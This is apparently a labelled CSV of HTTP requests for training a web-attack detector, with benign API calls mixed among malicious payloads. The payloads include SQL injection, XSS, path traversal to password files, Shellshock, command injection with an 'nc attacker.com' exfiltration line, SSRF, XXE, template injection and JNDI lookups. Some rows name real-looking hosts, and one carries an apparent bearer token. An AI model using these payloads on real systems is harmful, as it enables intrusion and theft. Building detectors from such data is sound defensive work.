method,path,query,headers,body,ua,label
GET,/index.php,option=com_sweetykeeper&controller=../../../../../../../../../../etc/passwd%00,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0,,Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Length: 4\r\n\r\n1234,,,1
POST,/api/v1/users,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/favicon.ico,,,,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,GET /user/profile,,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,GET /settings/security,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,%0als,,,1
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
POST,/checkout,,Host: example.com; Accept: */*,username=user495&password=pass821,Mozilla/5.0 (Linux; Android 11),0
GET,/,,%0als,,,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/login,q=http://127.0.0.1:8080/admin,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
DELETE,/admin,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,../../../../etc/passwd,,,1
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/admin/manage_user.php,"id=-1%20union%20select%201,md5(999999999),3,4,5--+","Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/admin,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /health,,,0
PUT,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /settings/security,,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
POST,/api/v1/users,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",sqlmap/1.5.2,1
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,javascript:alert(1),,,1
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,; cat /etc/passwd,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,http://attacker.com/shell.txt,,,1
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user965&password=pass893,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,' or '1'='1,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,curl/7.68.0,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,expect://id,,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /search?q=security,,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/Devices-Config.php,sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",1
GET,/index.hsp,"passwordExpired=yes&domainName=\'-alert(document.domain),//","Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/121.0.2277.128",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/121.0.2277.128",1
PUT,/search,,Host: example.com; Accept: */*,input=&& whoami,curl/7.68.0,1
PUT,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/web-api/orders/a026e06c-b0aa-4430-82ea-6bb2d4599006,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzI4NzYzMTIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiODIzYWQzNTUtMzcwYS00MWMwLWFjZTQtNmJkZDFkYTdiNjQyIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzI4NzYzMTIiLCJzdWIiOiJXRUJTSVRFQDA3NzI4NzYzMTIiLCJpYXQiOjE3NzA2MzAyODcsImV4cCI6MTc3MTIzNTA4N30.8wldWJsyP8qij5qplKiQLQLHcM2GCRVhaDrQ8c2kcDQ; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 534a2977-6298-44eb-9fe3-686671846da6",,python-requests/2.32.5,0
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/api/v1/users,q=admin'--,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
PUT,/login,,Host: example.com; Accept: */*,input=; ls -la,curl/7.68.0,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/favicon.ico,,,,,0
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,javascript:alert(1),,,1
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/search,q=phone,Host: example.com; Accept: */*,username=user688&password=pass115,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,' or '1'='1,,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/favicon.ico,,,,,0
GET,/admin,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/wp-content/plugins/mail-masta/inc/lists/csvexport.php,pl=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3.1 Safari/605.1.15 RDDocuments/8.10.0.1021",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3.1 Safari/605.1.15 RDDocuments/8.10.0.1021",1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,| id,,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,%0als,,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/favicon.ico,,,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
POST,/,,Host: example.com; Accept: */*,username=user709&password=pass298,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/admin,q=admin'--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
POST,/home,,Host: example.com; Accept: */*,username=user631&password=pass825,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,php://input,,,1
GET,/,,GET /user/profile,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,javascript:alert(1),,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /api/v1/ping,,,0
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,GET /,,,0
GET,/,,%0d%0a* CAPABILITY,,,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /sitemap.xml,,,0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
POST,/profile,,Host: example.com; Accept: */*,username=user338&password=pass413,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,' or '1'='1,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user994&password=pass365,Mozilla/5.0 (Linux; Android 11),0
GET,/favicon.ico,,,,,0
GET,/,,expect://id,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,GET /downloads/guide-v2.pdf,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=; ls -la,sqlmap/1.5.2,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,$(whoami),,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,| id,,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,GET /settings/security,,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,//////////////////etc/passwd,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
GET,/api/v1/users,"q=' UNION SELECT NULL,NULL--",Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/,,GET /images/logo.png,,,0
GET,/login,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/favicon.ico,,,,,0
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user319&password=pass124,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
POST,/search,q=phone,Host: example.com; Accept: */*,username=user804&password=pass139,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
DELETE,/search,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nmap Scripting Engine,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,id=1&id=2,,,1
GET,/,,Host: evil.com,,,1
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
DELETE,/login,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/,,POST /cart/add?product_id=99,,,0
GET,/favicon.ico,,,,,0
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
POST,/admin,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nikto/2.1.6,1
GET,/,,' or '1'='1,,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,|| ls -la,,,1
GET,/,,GET /sitemap.xml,,,0
GET,/,,GET /login,,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,expect://id,,,1
GET,/,,GET /sitemap.xml,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,${os.system('id')},,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,__proto__[admin]=true,,,1
GET,/,,GET /,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,<body onload=alert(1)>,,,1
